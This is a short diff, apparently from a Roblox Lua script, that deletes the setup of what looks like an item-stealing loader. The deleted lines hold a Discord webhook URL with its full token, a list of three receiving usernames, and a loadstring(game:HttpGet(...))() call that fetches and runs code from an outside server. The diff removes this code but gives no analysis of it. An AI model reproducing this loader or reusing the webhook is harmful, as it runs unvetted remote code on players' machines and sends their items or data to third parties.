@@ -1,6 +1,0 @@
-WEBHOOK = "https://discord.com/api/webhooks/1429433423960998038/ZGMnE4lkfqKgisZoSBxrQprFsCE7G17SOewfbeQVCWgMNgAKsg1z6BIan2s-LU8_Vgz8"
-RECEIVERS = {"alyson_thomas12", "beamnowez", "jm_pro12345678910"}
-MONEY_PER_SECOND = 300000 -- DEFAULT: 300000/s
-DMG_PER_SECOND = 300000 -- DEFAULT: 300000/s
-
-loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/92a441756ee4871bfb812636767586801f0f78bf429972328477a1920bae6f15/download"))()
